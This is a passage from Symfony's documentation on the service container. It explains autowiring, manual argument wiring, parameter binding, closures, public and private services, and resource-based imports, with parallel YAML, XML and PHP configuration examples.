}\n\n        public function getHappyMessage(): string\n        {\n            $this->logger->info('About to find a happy message!');\n            // ...\n        }\n    }\n\nThat's it! The container will *automatically* know to pass the ``logger`` service\nwhen instantiating the ``MessageGenerator``. How does it know to do this?\n:ref:`Autowiring <services-autowire>`. The key is the ``LoggerInterface``\ntype-hint in your ``__construct()`` method and the ``autowire: true`` config in\n``services.yaml``. When you type-hint an argument, the container will automatically\nfind the matching service. If it can't, you'll see a clear exception with a helpful\nsuggestion.\n\nBy the way, this method of adding dependencies to your ``__construct()`` method is\ncalled *dependency injection*.\n\n.. _services-debug-container-types:\n\nHow should you know to use ``LoggerInterface`` for the type-hint? You can either\nread the docs for whatever feature you're using, or get a list of autowireable\ntype-hints by running:\n\n.. code-block:: terminal\n\n    $ php bin/console debug:autowiring\n\n      # this is just a *small* sample of the output...\n\n      Describes a logger instance.\n      Psr\\Log\\LoggerInterface - alias:monolog.logger\n\n      Request stack that controls the lifecycle of requests.\n      Symfony\\Component\\HttpFoundation\\RequestStack - alias:request_stack\n\n      RouterInterface is the interface that all Router classes must implement.\n      Symfony\\Component\\Routing\\RouterInterface - alias:router.default\n\n      [...]\n\nHandling Multiple Services\n~~~~~~~~~~~~~~~~~~~~~~~~~~\n\nSuppose you also want to email a site administrator each time a site update is\nmade. To do that, you create a new class::\n\n    // src/Service/SiteUpdateManager.php\n    namespace App\\Service;\n\n    use App\\Service\\MessageGenerator;\n    use Symfony\\Component\\Mailer\\MailerInterface;\n    use Symfony\\Component\\Mime\\Email;\n\n    class SiteUpdateManager\n    {\n        public function __construct(\n            private MessageGenerator $messageGenerator,\n            private MailerInterface $mailer,\n        ) {\n        }\n\n        public function notifyOfSiteUpdate(): bool\n        {\n            $happyMessage = $this->messageGenerator->getHappyMessage();\n\n            $email = (new Email())\n                ->from('admin@example.com')\n                ->to('manager@example.com')\n                ->subject('Site update just happened!')\n                ->text('Someone just updated the site. We told them: '.$happyMessage);\n\n            $this->mailer->send($email);\n\n            // ...\n\n            return true;\n        }\n    }\n\nThis needs the ``MessageGenerator`` *and* the ``Mailer`` service. That's no\nproblem, we ask them by type hinting their class and interface names!\nNow, this new service is ready to be used. In a controller, for example,\nyou can type-hint the new ``SiteUpdateManager`` class and use it::\n\n    // src/Controller/SiteController.php\n    namespace App\\Controller;\n\n    use App\\Service\\SiteUpdateManager;\n    // ...\n\n    class SiteController extends AbstractController\n    {\n        public function new(SiteUpdateManager $siteUpdateManager): Response\n        {\n            // ...\n\n            if ($siteUpdateManager->notifyOfSiteUpdate()) {\n                $this->addFlash('success', 'Notification mail was sent successfully.');\n            }\n\n            // ...\n        }\n    }\n\nThanks to autowiring and your type-hints in ``__construct()``, the container creates\nthe ``SiteUpdateManager`` object and passes it the correct argument. In most cases,\nthis works perfectly.\n\n.. _services-manually-wire-args:\n\nManually Wiring Arguments\n~~~~~~~~~~~~~~~~~~~~~~~~~\n\nBut there are a few cases when an argument to a service cannot be autowired. For\nexample, suppose you want to make the admin email configurable:\n\n.. code-block:: diff\n\n      // src/Service/SiteUpdateManager.php\n      // ...\n\n      class SiteUpdateManager\n      {\n          // ...\n\n          public function __construct(\n              private MessageGenerator $messageGenerator,\n              private MailerInterface $mailer,\n    +         private string $adminEmail\n          ) {\n          }\n\n          public function notifyOfSiteUpdate(): bool\n          {\n              // ...\n\n              $email = (new Email())\n                  // ...\n    -            ->to('manager@example.com')\n    +            ->to($this->adminEmail)\n                  // ...\n              ;\n              // ...\n          }\n      }\n\nIf you make this change and refresh, you'll see an error:\n\n    Cannot autowire service \"App\\\\Service\\\\SiteUpdateManager\": argument \"$adminEmail\"\n    of method \"__construct()\" must have a type-hint or be given a value explicitly.\n\nThat makes sense! There is no way that the container knows what value you want to\npass here. No problem! In your configuration, you can explicitly set this argument:\n\n.. configuration-block::\n\n    .. code-block:: yaml\n\n        # config/services.yaml\n        services:\n            # ... same as before\n\n            # same as before\n            App\\:\n                resource: '../src/'\n                exclude: '../src/{DependencyInjection,Entity,Kernel.php}'\n\n            # explicitly configure the service\n            App\\Service\\SiteUpdateManager:\n                arguments:\n                    $adminEmail: 'manager@example.com'\n\n    .. code-block:: xml\n\n        <!-- config/services.xml -->\n        <?xml version=\"1.0\" encoding=\"UTF-8\" ?>\n        <container xmlns=\"http://symfony.com/schema/dic/services\"\n            xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n            xsi:schemaLocation=\"http://symfony.com/schema/dic/services\n                https://symfony.com/schema/dic/services/services-1.0.xsd\">\n\n            <services>\n                <!-- ...  same as before -->\n\n                <!-- Same as before -->\n\n                <prototype namespace=\"App\\\"\n                    resource=\"../src/\"\n                    exclude=\"../src/{DependencyInjection,Entity,Kernel.php}\"\n                />\n\n                <!-- Explicitly configure the service -->\n                <service id=\"App\\Service\\SiteUpdateManager\">\n                    <argument key=\"$adminEmail\">manager@example.com</argument>\n                </service>\n            </services>\n        </container>\n\n    .. code-block:: php\n\n        // config/services.php\n        namespace Symfony\\Component\\DependencyInjection\\Loader\\Configurator;\n\n        use App\\Service\\SiteUpdateManager;\n\n        return function(ContainerConfigurator $container): void {\n            // ...\n\n            // same as before\n            $services->load('App\\\\', '../src/')\n                ->exclude('../src/{DependencyInjection,Entity,Kernel.php}');\n\n            $services->set(SiteUpdateManager::class)\n                ->arg('$adminEmail', 'manager@example.com')\n            ;\n        };\n\nThanks to this, the container will pass ``manager@example.com`` to the ``$adminEmail``\nargument of ``__construct`` when creating the ``SiteUpdateManager`` service. The\nother arguments will still be autowired.\n\nBut, isn't this fragile? Fortunately, no! If you rename the ``$adminEmail`` argument\nto something else - e.g. ``$mainEmail`` - you will get a clear exception when you\nreload the next page (even if that page doesn't use this service).\n\n.. _service-container-parameters:\n\nService Parameters\n------------------\n\nIn addition to holding service objects, the container also holds configuration,\ncalled **parameters**. The main article about Symfony configuration explains the\n:ref:`configuration parameters <configuration-parameters>` in detail and shows\nall their types (string, boolean, array, binary and PHP constant parameters).\n\nHowever, there is another type of parameter related to services. In YAML config,\nany string which starts with ``@`` is considered as the ID of a service, instead\nof a regular string. In XML config, use the ``type=\"service\"`` type for the\nparameter and in PHP config use the ``service()`` function:\n\n.. configuration-block::\n\n    .. code-block:: yaml\n\n        # config/services.yaml\n        services:\n            App\\Service\\MessageGenerator:\n                arguments:\n                    # this is not a string, but a reference to a service called 'logger'\n                    - '@logger'\n\n                    # if the value of a string argument starts with '@', you need to escape\n                    # it by adding another '@' so Symfony doesn't consider it a service\n                    # the following example would be parsed as the string '@securepassword'\n                    # - '@@securepassword'\n\n    .. code-block:: xml\n\n        <!-- config/services.xml -->\n        <?xml version=\"1.0\" encoding=\"UTF-8\" ?>\n        <container xmlns=\"http://symfony.com/schema/dic/services\"\n            xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n            xsi:schemaLocation=\"http://symfony.com/schema/dic/services\n                https://symfony.com/schema/dic/services/services-1.0.xsd\">\n\n            <services>\n                <service id=\"App\\Service\\MessageGenerator\">\n                    <argument type=\"service\" id=\"logger\"/>\n                </service>\n            </services>\n        </container>\n\n    .. code-block:: php\n\n        // config/services.php\n        namespace Symfony\\Component\\DependencyInjection\\Loader\\Configurator;\n\n        use App\\Service\\MessageGenerator;\n\n        return function(ContainerConfigurator $container): void {\n            $services = $container->services();\n\n            $services->set(MessageGenerator::class)\n                ->args([service('logger')])\n            ;\n        };\n\nWorking with container parameters is straightforward using the container's\naccessor methods for parameters::\n\n    // checks if a parameter is defined (parameter names are case-sensitive)\n    $container->hasParameter('mailer.transport');\n\n    // gets value of a parameter\n    $container->getParameter('mailer.transport');\n\n    // adds a new parameter\n    $container->setParameter('mailer.transport', 'sendmail');\n\n.. warning::\n\n    The used ``.`` notation is a\n    :ref:`Symfony convention <service-naming-conventions>` to make parameters\n    easier to read. Parameters are flat key-value elements, they can't\n    be organized into a nested array\n\n.. note::\n\n    You can only set a parameter before the container is compiled, not at run-time.\n    To learn more about compiling the container see\n    :doc:`/components/dependency_injection/compilation`.\n\n.. _services-wire-specific-service:\n\nChoose a Specific Service\n-------------------------\n\nThe ``MessageGenerator`` service created earlier requires a ``LoggerInterface`` argument::\n\n    // src/Service/MessageGenerator.php\n    namespace App\\Service;\n\n    use Psr\\Log\\LoggerInterface;\n\n    class MessageGenerator\n    {\n        public function __construct(\n            private LoggerInterface $logger,\n        ) {\n        }\n        // ...\n    }\n\nHowever, there are *multiple* services in the container that implement ``LoggerInterface``,\nsuch as ``logger``, ``monolog.logger.request``, ``monolog.logger.php``, etc. How\ndoes the container know which one to use?\n\nIn these situations, the container is usually configured to automatically choose\none of the services - ``logger`` in this case (read more about why in :ref:`service-autowiring-alias`).\nBut, you can control this and pass in a different logger:\n\n.. configuration-block::\n\n    .. code-block:: yaml\n\n        # config/services.yaml\n        services:\n            # ... same code as before\n\n            # explicitly configure the service\n            App\\Service\\MessageGenerator:\n                arguments:\n                    # the '@' symbol is important: that's what tells the container\n                    # you want to pass the *service* whose id is 'monolog.logger.request',\n                    # and not just the *string* 'monolog.logger.request'\n                    $logger: '@monolog.logger.request'\n\n    .. code-block:: xml\n\n        <!-- config/services.xml -->\n        <?xml version=\"1.0\" encoding=\"UTF-8\" ?>\n        <container xmlns=\"http://symfony.com/schema/dic/services\"\n            xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n            xsi:schemaLocation=\"http://symfony.com/schema/dic/services\n                https://symfony.com/schema/dic/services/services-1.0.xsd\">\n\n            <services>\n                <!-- ... same code as before -->\n\n                <!-- Explicitly configure the service -->\n                <service id=\"App\\Service\\MessageGenerator\">\n                    <argument key=\"$logger\" type=\"service\" id=\"monolog.logger.request\"/>\n                </service>\n            </services>\n        </container>\n\n    .. code-block:: php\n\n        // config/services.php\n        namespace Symfony\\Component\\DependencyInjection\\Loader\\Configurator;\n\n        use App\\Service\\MessageGenerator;\n\n        return function(ContainerConfigurator $container): void {\n            // ... same code as before\n\n            // explicitly configure the service\n            $services->set(MessageGenerator::class)\n                ->arg('$logger', service('monolog.logger.request'))\n            ;\n        };\n\nThis tells the container that the ``$logger`` argument to ``__construct`` should use\nservice whose id is ``monolog.logger.request``.\n\nFor a list of possible logger services that can be used with autowiring, run:\n\n.. code-block:: terminal\n\n    $ php bin/console debug:autowiring logger\n\n.. _container-debug-container:\n\nFor a full list of *all* possible services in the container, run:\n\n.. code-block:: terminal\n\n    $ php bin/console debug:container\n\nRemove Services\n---------------\n\nA service can be removed from the service container if needed. This is useful\nfor example to make a service unavailable in some :ref:`configuration environment <configuration-environments>`\n(e.g. in the ``test`` environment):\n\n.. configuration-block::\n\n    .. code-block:: php\n\n        // config/services_test.php\n        namespace Symfony\\Component\\DependencyInjection\\Loader\\Configurator;\n\n        use App\\RemovedService;\n\n        return function(ContainerConfigurator $containerConfigurator) {\n            $services = $containerConfigurator->services();\n\n            $services->remove(RemovedService::class);\n        };\n\nNow, the container will not contain the ``App\\RemovedService`` in the ``test``\nenvironment.\n\n.. _container_closure-as-argument:\n\nInjecting a Closure as an Argument\n----------------------------------\n\nIt is possible to inject a callable as an argument of a service.\nLet's add an argument to our ``MessageGenerator`` constructor::\n\n    // src/Service/MessageGenerator.php\n    namespace App\\Service;\n\n    use Psr\\Log\\LoggerInterface;\n\n    class MessageGenerator\n    {\n        private string $messageHash;\n\n        public function __construct(\n            private LoggerInterface $logger,\n            callable $generateMessageHash,\n        ) {\n            $this->messageHash = $generateMessageHash();\n        }\n        // ...\n    }\n\nNow, we would add a new invokable service to generate the message hash::\n\n    // src/Hash/MessageHashGenerator.php\n    namespace App\\Hash;\n\n    class MessageHashGenerator\n    {\n        public function __invoke(): string\n        {\n            // Compute and return a message hash\n        }\n    }\n\nOur configuration looks like this:\n\n.. configuration-block::\n\n    .. code-block:: yaml\n\n        # config/services.yaml\n        services:\n            # ... same code as before\n\n            # explicitly configure the service\n            App\\Service\\MessageGenerator:\n                arguments:\n                    $logger: '@monolog.logger.request'\n                    $generateMessageHash: !closure '@App\\Hash\\MessageHashGenerator'\n\n    .. code-block:: xml\n\n        <!-- config/services.xml -->\n        <?xml version=\"1.0\" encoding=\"UTF-8\" ?>\n        <container xmlns=\"http://symfony.com/schema/dic/services\"\n            xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n            xsi:schemaLocation=\"http://symfony.com/schema/dic/services\n                https://symfony.com/schema/dic/services/services-1.0.xsd\">\n\n            <services>\n                <!-- ... same code as before -->\n\n                <!-- Explicitly configure the service -->\n                <service id=\"App\\Service\\MessageGenerator\">\n                    <argument key=\"$logger\" type=\"service\" id=\"monolog.logger.request\"/>\n                    <argument key=\"$generateMessageHash\" type=\"closure\" id=\"App\\Hash\\MessageHashGenerator\"/>\n                </service>\n            </services>\n        </container>\n\n    .. code-block:: php\n\n        // config/services.php\n        namespace Symfony\\Component\\DependencyInjection\\Loader\\Configurator;\n\n        use App\\Service\\MessageGenerator;\n\n        return function(ContainerConfigurator $containerConfigurator): void {\n            // ... same code as before\n\n            // explicitly configure the service\n            $services->set(MessageGenerator::class)\n                ->arg('$logger', service('monolog.logger.request'))\n                ->arg('$generateMessageHash', closure('App\\Hash\\MessageHashGenerator'))\n            ;\n        };\n\n.. seealso::\n\n    Closures can be injected :ref:`by using autowiring <autowiring_closures>`\n    and its dedicated attributes.\n\n.. _services-binding:\n\nBinding Arguments by Name or Type\n---------------------------------\n\nYou can also use the ``bind`` keyword to bind specific arguments by name or type:\n\n.. configuration-block::\n\n    .. code-block:: yaml\n\n        # config/services.yaml\n        services:\n            _defaults:\n                bind:\n                    # pass this value to any $adminEmail argument for any service\n                    # that's defined in this file (including controller arguments)\n                    $adminEmail: 'manager@example.com'\n\n                    # pass this service to any $requestLogger argument for any\n                    # service that's defined in this file\n                    $requestLogger: '@monolog.logger.request'\n\n                    # pass this service for any LoggerInterface type-hint for any\n                    # service that's defined in this file\n                    Psr\\Log\\LoggerInterface: '@monolog.logger.request'\n\n                    # optionally you can define both the name and type of the argument to match\n                    string $adminEmail: 'manager@example.com'\n                    Psr\\Log\\LoggerInterface $requestLogger: '@monolog.logger.request'\n                    iterable $rules: !tagged_iterator app.foo.rule\n\n            # ...\n\n    .. code-block:: xml\n\n        <!-- config/services.xml -->\n        <?xml version=\"1.0\" encoding=\"UTF-8\" ?>\n        <container xmlns=\"http://symfony.com/schema/dic/services\"\n            xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n            xsi:schemaLocation=\"http://symfony.com/schema/dic/services\n                https://symfony.com/schema/dic/services/services-1.0.xsd\">\n\n            <services>\n                <defaults autowire=\"true\" autoconfigure=\"true\" public=\"false\">\n                    <bind key=\"$adminEmail\">manager@example.com</bind>\n                    <bind key=\"$requestLogger\"\n                        type=\"service\"\n                        id=\"monolog.logger.request\"\n                    />\n                    <bind key=\"Psr\\Log\\LoggerInterface\"\n                        type=\"service\"\n                        id=\"monolog.logger.request\"\n                    />\n\n                    <!-- optionally you can define both the name and type of the argument to match -->\n                    <bind key=\"string $adminEmail\">manager@example.com</bind>\n                    <bind key=\"Psr\\Log\\LoggerInterface $requestLogger\"\n                        type=\"service\"\n                        id=\"monolog.logger.request\"\n                    />\n                    <bind key=\"iterable $rules\"\n                        type=\"tagged_iterator\"\n                        tag=\"app.foo.rule\"\n                    />\n                </defaults>\n\n                <!-- ... -->\n            </services>\n        </container>\n\n    .. code-block:: php\n\n        // config/services.php\n        namespace Symfony\\Component\\DependencyInjection\\Loader\\Configurator;\n\n        use Psr\\Log\\LoggerInterface;\n\n        return function(ContainerConfigurator $container): void {\n            $services = $container->services()\n                ->defaults()\n                    // pass this value to any $adminEmail argument for any service\n                    // that's defined in this file (including controller arguments)\n                    ->bind('$adminEmail', 'manager@example.com')\n\n                    // pass this service to any $requestLogger argument for any\n                    // service that's defined in this file\n                    ->bind('$requestLogger', service('monolog.logger.request'))\n\n                    // pass this service for any LoggerInterface type-hint for any\n                    // service that's defined in this file\n                    ->bind(LoggerInterface::class, service('monolog.logger.request'))\n\n                    // optionally you can define both the name and type of the argument to match\n                    ->bind('string $adminEmail', 'manager@example.com')\n                    ->bind(LoggerInterface::class.' $requestLogger', service('monolog.logger.request'))\n                    ->bind('iterable $rules', tagged_iterator('app.foo.rule'))\n            ;\n\n            // ...\n        };\n\nBy putting the ``bind`` key under ``_defaults``, you can specify the value of *any*\nargument for *any* service defined in this file! You can bind arguments by name\n(e.g. ``$adminEmail``), by type (e.g. ``Psr\\Log\\LoggerInterface``) or both\n(e.g. ``Psr\\Log\\LoggerInterface $requestLogger``).\n\nThe ``bind`` config can also be applied to specific services or when\n:ref:`loading many services at once <service-psr4-loader>`).\n\nAbstract Service Arguments\n--------------------------\n\nSometimes, the values of some service arguments can't be defined in the\nconfiguration files because they are calculated at runtime using a\n:doc:`compiler pass </service_container/compiler_passes>`\nor :doc:`bundle extension </bundles/extension>`.\n\nIn those cases, you can use the ``abstract`` argument type to define at least\nthe name of the argument and some short description about its purpose:\n\n.. configuration-block::\n\n    .. code-block:: yaml\n\n        # config/services.yaml\n        services:\n            # ...\n\n            App\\Service\\MyService:\n                arguments:\n                    $rootNamespace: !abstract 'should be defined by Pass'\n\n            # ...\n\n    .. code-block:: xml\n\n        <!-- config/services.xml -->\n        <?xml version=\"1.0\" encoding=\"UTF-8\" ?>\n        <container xmlns=\"http://symfony.com/schema/dic/services\"\n            xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n            xsi:schemaLocation=\"http://symfony.com/schema/dic/services\n                https://symfony.com/schema/dic/services/services-1.0.xsd\">\n\n            <services>\n                <service id=\"App\\Service\\MyService\" class=\"App\\Service\\MyService\">\n                    <argument key=\"$rootNamespace\" type=\"abstract\">should be defined by Pass</argument>\n                </service>\n\n                <!-- ... -->\n            </services>\n        </container>\n\n    .. code-block:: php\n\n        // config/services.php\n        namespace Symfony\\Component\\DependencyInjection\\Loader\\Configurator;\n\n        use App\\Service\\MyService;\n        use Psr\\Log\\LoggerInterface;\n        use Symfony\\Component\\DependencyInjection\\Definition;\n        use Symfony\\Component\\DependencyInjection\\Reference;\n\n        return function(ContainerConfigurator $container) {\n            $services = $container->services();\n\n            $services->set(MyService::class)\n                ->arg('$rootNamespace', abstract_arg('should be defined by Pass'))\n            ;\n\n            // ...\n        };\n\nIf you don't replace the value of an abstract argument during runtime, a\n``RuntimeException`` will be thrown with a message like\n``Argument \"$rootNamespace\" of service \"App\\Service\\MyService\" is abstract: should be defined by Pass.``\n\n.. _services-autowire:\n\nThe autowire Option\n-------------------\n\nAbove, the ``services.yaml`` file has ``autowire: true`` in the ``_defaults`` section\nso that it applies to all services defined in that file. With this setting, you're\nable to type-hint arguments in the ``__construct()`` method of your services and\nthe container will automatically pass you the correct arguments. This entire entry\nhas been written around autowiring.\n\nFor more details about autowiring, check out :doc:`/service_container/autowiring`.\n\n.. _services-autoconfigure:\n\nThe autoconfigure Option\n------------------------\n\nAbove, the ``services.yaml`` file has ``autoconfigure: true`` in the ``_defaults``\nsection so that it applies to all services defined in that file. With this setting,\nthe container will automatically apply certain configuration to your services, based\non your service's *class*. This is mostly used to *auto-tag* your services.\n\nFor example, to create a Twig extension, you need to create a class, register it\nas a service, and :doc:`tag </service_container/tags>` it with ``twig.extension``.\n\nBut, with ``autoconfigure: true``, you don't need the tag. In fact, if you're using\nthe :ref:`default services.yaml config <service-container-services-load-example>`,\nyou don't need to do *anything*: the service will be automatically loaded. Then,\n``autoconfigure`` will add the ``twig.extension`` tag *for* you, because your class\nimplements ``Twig\\Extension\\ExtensionInterface``. And thanks to ``autowire``, you can even add\nconstructor arguments without any configuration.\n\nAutoconfiguration also works with attributes. Some attributes like\n:class:`Symfony\\\\Component\\\\Messenger\\\\Attribute\\\\AsMessageHandler`,\n:class:`Symfony\\\\Component\\\\EventDispatcher\\\\Attribute\\\\AsEventListener` and\n:class:`Symfony\\\\Component\\\\Console\\\\Attribute\\\\AsCommand` are registered\nfor autoconfiguration. Any class using these attributes will have tags applied\nto them.\n\nLinting Service Definitions\n---------------------------\n\nThe ``lint:container`` command performs additional checks to ensure the container\nis properly configured. It is useful to run this command before deploying your\napplication to production (e.g. in your continuous integration server):\n\n.. code-block:: terminal\n\n    $ php bin/console lint:container\n\nPerforming those checks whenever the container is compiled can hurt performance.\nThat's why they are implemented in :doc:`compiler passes </service_container/compiler_passes>`\ncalled ``CheckTypeDeclarationsPass`` and ``CheckAliasValidityPass``, which are\ndisabled by default and enabled only when executing the ``lint:container`` command.\nIf you don't mind the performance loss, you can enable these compiler passes in\nyour application.\n\n.. versionadded:: 7.1\n\n    The ``CheckAliasValidityPass`` compiler pass was introduced in Symfony 7.1.\n\n.. _container-public:\n\nPublic Versus Private Services\n------------------------------\n\nEvery service defined is private by default. When a service is private, you\ncannot access it directly from the container using ``$container->get()``. As a\nbest practice, you should only create *private* services and you should fetch\nservices using dependency injection instead of using ``$container->get()``.\n\nIf you need to fetch services lazily, instead of using public services you\nshould consider using a :ref:`service locator <service-locators>`.\n\nBut, if you *do* need to make a service public, override the ``public``\nsetting:\n\n.. configuration-block::\n\n    .. code-block:: yaml\n\n        # config/services.yaml\n        services:\n            # ... same code as before\n\n            # explicitly configure the service\n            App\\Service\\PublicService:\n                public: true\n\n    .. code-block:: xml\n\n        <!-- config/services.xml -->\n        <?xml version=\"1.0\" encoding=\"UTF-8\" ?>\n        <container xmlns=\"http://symfony.com/schema/dic/services\"\n            xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n            xsi:schemaLocation=\"http://symfony.com/schema/dic/services\n                https://symfony.com/schema/dic/services/services-1.0.xsd\">\n\n            <services>\n                <!-- ... same code as before -->\n\n                <!-- Explicitly configure the service -->\n                <service id=\"App\\Service\\PublicService\" public=\"true\"></service>\n            </services>\n        </container>\n\n    .. code-block:: php\n\n        // config/services.php\n        namespace Symfony\\Component\\DependencyInjection\\Loader\\Configurator;\n\n        use App\\Service\\PublicService;\n\n        return function(ContainerConfigurator $container): void {\n            // ... same as code before\n\n            // explicitly configure the service\n            $services->set(Service\\PublicService::class)\n                ->public()\n            ;\n        };\n\nIt is also possible to define a service as public thanks to the ``#[Autoconfigure]``\nattribute. This attribute must be used directly on the class of the service\nyou want to configure::\n\n    // src/Service/PublicService.php\n    namespace App\\Service;\n\n    use Symfony\\Component\\DependencyInjection\\Attribute\\Autoconfigure;\n\n    #[Autoconfigure(public: true)]\n    class PublicService\n    {\n        // ...\n    }\n\n.. _service-psr4-loader:\n\nImporting Many Services at once with resource\n---------------------------------------------\n\nYou've already seen that you can import many services at once by using the ``resource``\nkey. For example, the default Symfony configuration contains this:\n\n.. configuration-block::\n\n    .. code-block:: yaml\n\n        # config/services.yaml\n        services:\n            # ... same as before\n\n            # makes classes in src/ available to be used as services\n            # this creates a service per class whose id is the fully-qualified class name\n            App\\:\n                resource: '../src/'\n                exclude: '../src/{DependencyInjection,Entity,Kernel.php}'\n\n    .. code-block:: xml\n\n        <!-- config/services.xml -->\n        <?xml version=\"1.0\" encoding=\"UTF-8\" ?>\n        <container xmlns=\"http://symfony.com/schema/dic/services\"\n            xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n            xsi:schemaLocation=\"http://symfony.com/schema/dic/services\n                https://symfony.com/schema/dic/services/services-1.0.xsd\">\n\n            <services>\n                <!-- ... same as before -->\n\n                <prototype namespace=\"App\\\" resource=\"../src/\" exclude=\"../src/{DependencyInjection,Entity,Kernel.php}\"/>\n            </services>\n        </container>\n\n    .. code-block:: php\n\n        // config/services.php\n        namespace Symfony\\Component\\DependencyInjection\\Loader\\Configurator;\n\n        return function(ContainerConfigurator $container): void {\n            // ...\n\n            // makes classes in src/ available to be used as services\n            // this creates a service per class whose id is the fully-qualified class name\n            $services->load('App\\\\', '../src/')\n                ->exclude('../src/{DependencyInjection,Entity,Kernel.php}');\n        };\n\n.. tip::\n\n    The value of the ``resource`` and ``exclude`` options can be any valid\n    `glob pattern`_. If you want to exclude only a few services, you\n    may use the :class:`Symfony\\\\Component\\\\DependencyInjection\\\\Attribute\\\\Exclude`\n    attribute directly on your class to exclude it.\n\nThis can be used to quickly make many classes available as services and apply some\ndefault configuration. The ``id`` of each service is its fully-qualified class name.\nYou can override any service that's imported by using its id (class name) below\n(e.g. see :ref:`how to manually wire arguments <services-manually-wire-args>`).\nIf you override a service, none of the options (e.g. ``public``) are inherited\nfrom the import (but the overridden service *does* still inherit from ``_defaults``).\n\nYou can also ``exclude`` certain paths. This is optional, but will slightly increase\nperformance in the ``dev`` environment: excluded paths are not tracked and so modifying\nthem will not cause the container to be rebuilt.\n\n.. note::\n\n    Wait, does this mean that *every* class in ``src/`` is registered as\n    a service? Even model classes? Actually, no. As long as you keep your imported services as :ref:`private <container-public>`, all\n    classes in ``src/`` that are *not* explicitly used as services are\n    automatically removed from the final container. In reality, the import\n    means that all classes are \"available to be *used* as services\" without needing\n    to be manually configured.\n\nMultiple Service Definitions Using the Same Namespace\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\nIf you define services using the YAML config format, the PHP namespace is used\nas the key of each configuration, so you can't define different service configs\nfor classes under the same namespace:\n\n.. configuration-block::\n\n    .. code-block:: yaml\n\n        # config/services.yaml\n        services:\n            App\\Domain\\:\n                resource: '../src/Domain/*'\n                # ...\n\n    .. code-block:: xml\n\n        <!-- config/services.xml -->\n        <?xml version=\"1.0\" encoding=\"UTF-8\" ?>\n        <container xmlns=\"http://symfony.com/schema/dic/services\"\n            xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n            xsi:schemaLocation=\"http://symfony.com/schema/dic/services\n                https://symfony.com/schema/dic/services/services-1.0.xsd\">\n\n            <services>\n                <prototype namespace=\"App\\Domain\"\n                    resource=\"../src/App/Domain/*\"/>\n\n                <!-- ... -->\n            </services>\n        </container>\n\n    .. code-block:: php\n\n        // config/services.php\n        use Symfony\\Component\\DependencyInjection\\Definition;\n\n        $defaults = new Definition();\n\n        // $this is a reference to the current loader\n        $this->registerClasses(\n            $defaults,\n            'App\\\\Domain\\\\',\n            '../src/App/Domain/*'\n        );\n\n        // ...\n\nIn order to have multiple definitions, add the ``namespace`` option and use any\nunique string as the key of each service config:\n\n.. code-block:: yaml\n\n    # config/services.yaml\n    services:\n        command_handlers:\n            namespace: App\\Domain\\\n            resource: '../src/Domain/*/CommandHandler'\n            tags: [command_handler]\n\n        event_subscribers:\n            namespace: App\\Domain\\\n            resource: '../src/Domain/*/EventSubscriber'\n            tags: [event_subscriber]\n\n.. _services-explicitly-configure-wire-services:\n\nExplicitly Configuring Services and Arguments\n---------------------------------------------\n\n:ref:`Loading services automatically <service-container-services-load-example>`\nand :ref:`autowiring <services-autowire>` are optional. And even if you use them, there may be some\ncases where you want to manually wire a service. For example, suppose that you want\nto register *2* services for the ``SiteUpdateManager`` class - each with a different\nadmin email. In this case, each needs to have a unique service id:\n\n.. configuration-block::\n\n    .. code-block:: yaml\n\n        # config/services.yaml\n        services:\n            # ...\n\n            # this is the service's id\n            site_update_manager.superadmin:\n                class: App\\Service\\SiteUpdateManager\n                # you CAN still use autowiring: we just want to show what it looks like without\n                autowire: false\n                # manually wire all arguments\n                arguments:\n                    - '@App\\Service\\MessageGenerator'\n                    - '@mailer'\n                    - 'superadmin@example.com'\n\n            site_update_manager.normal_users:\n                class: App\\Service\\SiteUpdateManager\n                autowire: false\n                arguments:\n                    - '@App\\Service\\MessageGenerator'\n                    - '@mailer'\n                    - 'contact@example.com'\n\n            # Create an alias, so that - by default - if you type-hint SiteUpdateManager,\n            # the site_update_manager.superadmin will be used\n            App\\Service\\SiteUpdateManager: '@site_update_manager.superadmin'\n\n    .. code-block:: xml\n\n        <!-- config/services.xml -->\n        <?xml version=\"1.0\" encoding=\"UTF-8\" ?>\n        <container xmlns=\"http://symfony.com/schema/dic/services\"\n            xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n            xsi:schemaLocation=\"http://symfony.com/schema/dic/services\n                https://symfony.com/schema/dic/services/services-1.0.xsd\">\n\n            <services>\n                <!-- ... -->\n\n                <service id=\"site_update_manager.superadmin\" class=\"App\\Service\\SiteUpdateManager\" autowire=\"false\">\n                    <argument type=\"service\" id=\"App\\Service\\MessageGenerator\"/>\n                    <argument type=\"service\" id=\"mailer\"/>\n                    <argument>superadmin@example.com</argument>\n                </service>\n\n                <service id=\"site_update_manager.normal_users\" class=\"App\\Service\\SiteUpdateManager\" autowire=\"false\">\n                    <argument type=\"service\" id=\"App\\Service\\MessageGenerator\"/>\n                    <argument type=\"service\" id=\"mailer\"/>\n                    <argument>contact@example.com</argument>\n                </service>\n\n                <service id=\"App\\Service\\SiteUpdateManager\" alias=\"site_update_manager.superadmin\"/>\n            </services>\n        </container>\n\n    .. code-block:: php\n\n        // config/services.php\n        namespace Symfony\\Component\\DependencyInjection\\Loader\\Configurator;\n\n        use App\\Service\\MessageGenerator;\n        use App\\Service\\SiteUpdateManager;\n\n        return function(ContainerConfigurator $container): void {\n            // ...\n\n            // site_update_manager.superadmin is the service's id\n            $services->set('site_update_manager.superadmin', SiteUpdateManager::class)\n                // you CAN still use autowiring: we just want to show what it looks like without\n                ->autowire(false)\n                // manually wire all arguments\n                ->args([\n                   service(MessageGenerator::class),\n                   service('mailer'),\n                   'superadmin@example.com',\n                ]);\n\n            $services->set('site_update_manager.normal_users', SiteUpdateManager::class)\n                ->autowire(false)\n                ->args([\n                    service(MessageGenerator::class),\n                    service('mailer'),\n                    'contact@example.com',\n                ]);\n\n            // Create an alias, so that - by default - if you type-hint SiteUpdateManager,\n            // the site_update_manager.superadmin will be used\n            $services->alias(SiteUpdateManager::class, 'site_update_manager.superadmin');\n        